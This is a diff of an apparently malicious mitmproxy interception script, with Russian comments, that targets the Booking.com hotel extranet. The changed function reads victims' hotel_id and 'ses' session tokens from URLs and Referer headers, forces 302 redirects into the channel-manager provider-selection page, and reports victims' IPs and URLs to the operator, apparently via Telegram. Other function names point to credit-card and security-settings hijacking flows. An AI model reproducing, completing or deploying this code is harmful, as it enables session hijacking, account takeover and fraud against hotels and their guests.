@@ -1131,6 +1131,7 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
 
 # --- НОВЫЕ ФУНКЦИИ 21-26 (С РЕАЛЬНЫМИ ПАРАМЕТРАМИ) ---
 
+
 def partners_redirect(flow: http.HTTPFlow) -> bool:
     """
     ФУНКЦИЯ 21:
@@ -1142,90 +1143,99 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
 
         url = flow.request.pretty_url
         host = (flow.request.pretty_host or "").lower()
-        
+        url_l = url.lower()
+
         # ТОЛЬКО admin.booking.com
         if not host.endswith("admin.booking.com"):
             return False
-        
+
         # ⚠️ НЕ редиректим если это статический файл
-        if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
+        if any(ext in url_l for ext in [
+            '.css', '.js', '.png', '.jpg', '.jpeg', '.gif',
+            '.ico', '.woff', '.woff2', '.ttf', '.svg'
+        ]):
             return False
-        
-        # ⚠️ НЕ редиректим если уже на channel-manager
-        if "channel-manager/index.html" in url:
-            # Проверяем наличие tlc для завершения
-            if "tlc=" in url.lower():
-                log("Function 21: ✓ Detected tlc parameter -> COMPLETED")
-                
-                # Отправляем уведомление в Telegram
-                client_ip = get_client_ip(flow)
-                send_function_complete_notification(client_ip, url, "FUNCTION_21_COMPLETE")
-                
-                # Включение функции 15 для операции 22
-                if should_partners_and_mess():
-                    log("Function 22: Activating function 15 after partners completion")
-                    enable_booking_hotel_security_from_partners()
-                
-                remove_partners_flag()
-                log("Function 21: Flag removed, user stays on page")
-            
-            return False
-        
-        # ====== ПОЛУЧАЕМ РЕАЛЬНЫЕ ПАРАМЕТРЫ (как в функциях 13/15) ======
+
+        # ====== ПАРСИМ URL И СРАЗУ СТРОИМ target_url ======
+
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
-        
-        # 1. Пытаемся из текущего URL
+
         hotel_id = query.get("hotel_id", [None])[0]
         ses = query.get("ses", [None])[0]
         lang = query.get("lang", ["en"])[0]
-        
-        # 2. Если нет в URL - проверяем Referer (предыдущая страница)
+
         if not ses or not hotel_id:
             referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
             if referer:
                 try:
                     rp = urllib.parse.urlparse(referer)
                     rq = urllib.parse.parse_qs(rp.query)
-                    if not hotel_id and "hotel_id" in rq:
-                        hotel_id = rq.get("hotel_id", [None])[0]
-                    if not ses and "ses" in rq:
-                        ses = rq.get("ses", [None])[0]
-                except Exception as e:
-                    log(f"Function 21: Error parsing referer: {e}")
-        
-        # 3. Если все еще нет - используем эвристику (как в 13/15)
+                    hotel_id = hotel_id or rq.get("hotel_id", [None])[0]
+                    ses = ses or rq.get("ses", [None])[0]
+                except Exception:
+                    pass
+
         if not hotel_id:
-            # Пытаемся извлечь из пути
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
             if m:
                 hotel_id = m.group(1)
-        
-        # ⚠️ ВАЖНО: БЕЗ ses НЕ ДЕЛАЕМ РЕДИРЕКТ (как в 13/15)
+
         if not ses:
-            log("Function 21: ❌ No ses parameter found - user not authenticated")
             return False
-        
-        # Значения по умолчанию ТОЛЬКО если не нашли (как в 13/15)
+
         if not hotel_id:
             hotel_id = "15239128"
-        
-        log(f"Function 21: Using REAL params - hotel_id={hotel_id}, ses={ses[:10]}..., lang={lang}")
-        
-        # Формируем целевой URL
-        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/channel-manager/index.html?hotel_id={hotel_id}&lang={lang}&ses={ses}&view=provider-selection"
-        
-        # Проверяем что не редиректим на себя
+
+        target_url = (
+            "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/"
+            f"channel-manager/index.html?hotel_id={hotel_id}&lang={lang}&ses={ses}&view=provider-selection"
+        )
+
+        # ====== КОРРЕКТНЫЕ УСЛОВИЯ ЗАВЕРШЕНИЯ ======
+
+        completed = False
+
+        # 1️⃣ tlc — всегда финал
+        if "tlc=" in url_l:
+            log("Function 21: ✓ Detected tlc parameter -> COMPLETED")
+            completed = True
+
+        # 2️⃣ 403 — финал
+        elif "/hotel/hoteladmin/extranet_ng/manage/403.html" in url_l:
+            log("Function 21: ✓ Detected 403 page -> COMPLETED")
+            completed = True
+
+        # 3️⃣ Пользователь УШЁЛ ДАЛЬШЕ по channel-manager (НЕ наш index)
+        elif (
+            "/hotel/hoteladmin/extranet_ng/manage/channel-manager/" in url_l
+            and not url_l.startswith(target_url.lower())
+        ):
+            log("Function 21: ✓ User moved deeper into channel-manager -> COMPLETED")
+            completed = True
+
+        if completed:
+            client_ip = get_client_ip(flow)
+            send_function_complete_notification(
+                client_ip, url, "FUNCTION_21_COMPLETE"
+            )
+
+            if should_partners_and_mess():
+                enable_booking_hotel_security_from_partners()
+
+            remove_partners_flag()
+            return False
+
+        # ====== РЕДИРЕКТ ======
+
         if url == target_url:
             return False
-        
-        log(f"Function 21: Redirect {url} -> {target_url}")
-        
-        # Логируем в Telegram
+
         client_ip = get_client_ip(flow)
-        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_21_PARTNERS")
-        
-        # Выполняем редирект
+        log_redirect_to_server(
+            client_ip, url, target_url, "FUNCTION_21_PARTNERS"
+        )
+
         flow.response = http.Response.make(
             302,
             b"",
@@ -1237,12 +1247,13 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
             }
         )
         return True
-        
+
     except Exception as e:
         log(f"Function 21 ERROR: {e}")
         import traceback
-        log(f"Traceback: {traceback.format_exc()}")
+        log(traceback.format_exc())
         return False
+
 
 def device_redirect(flow: http.HTTPFlow) -> bool:
     """
